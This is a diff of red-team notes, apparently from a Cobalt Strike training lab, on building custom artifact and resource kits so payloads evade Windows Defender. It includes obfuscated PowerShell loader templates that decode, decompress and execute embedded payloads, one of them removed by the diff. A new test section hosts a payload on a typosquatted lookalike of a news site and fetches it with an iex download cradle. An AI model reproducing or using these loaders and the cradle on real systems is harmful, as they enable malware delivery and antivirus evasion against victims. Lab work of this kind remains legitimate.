@@ -1,5 +1,5 @@
 
-##### Artifacts
+### Artifacts
 
 Open the artifacts folder within Visual Studio Code and open up `src-common/patch.c`
 
@@ -34,7 +34,7 @@ Import the `artifact.cna` file into the Cobalt Strike script manager - `C:\Tools
 
 ---
 
-##### Resources
+### Resources
 
 Open the resource folder in the arsenal-kit and build new resources
 ```bash
@@ -77,8 +77,6 @@ Invoke-Obfuscation> SET SCRIPTBLOCK [compress.ps1 contents]
 Or use this:
 ```powershell
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
-
-$oHQi= [TyPe]('cONV'+'eRt');  sEt-VarIablE  ('D'+'7N9') ([Type]('IO.Com'+'PresSIOn'+'.cOMPR'+'esSI'+'O'+'NM'+'ODE') ) ; $s=&('N'+'e'+'w-Obje'+'ct') ('IO.Me'+'m'+'oryS'+'tream')(,  $OHqi::FromBase64String("%%DATA%%"));&('I'+'EX') (&('Ne'+'w'+'-Object') ('IO.'+'St'+'r'+'eamReader')(&('New-'+'Obje'+'ct') ('IO.Comp'+'ress'+'io'+'n.Gz'+'i'+'pStre'+'am')($s,  $D7N9::Decompress))).ReadToEnd();
 ```
 
 Import the `resources.cna` file into the Cobalt Strike script manager - `C:\Tools\cobaltstrike\custom-resources\`
@@ -139,3 +137,23 @@ sudo /usr/bin/docker restart cobaltstrike-cs-1
 ```
 
 > If the container fails to restart properly use `sudo /usr/bin/docker logs cobaltstrike-cs-1` to see the profile errors.
+
+---
+
+### Test
+
+Build new payloads:
+- Go to **Payloads > Windows Stageless Generate All Payloads**
+
+Host a 64-bit PowerShell payload.
+1. Go to **Site Management > Host File**
+2. File: _C:\Payloads\http_x64.ps1_
+3. Local URI: /test
+4. Local Host: www.bleepincomputer.com
+
+Verify that Defender is enabled and execute up on test host
+```powershell
+(Get-MpPreference).DisableRealtimeMonitoring
+
+iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/test2")
+```
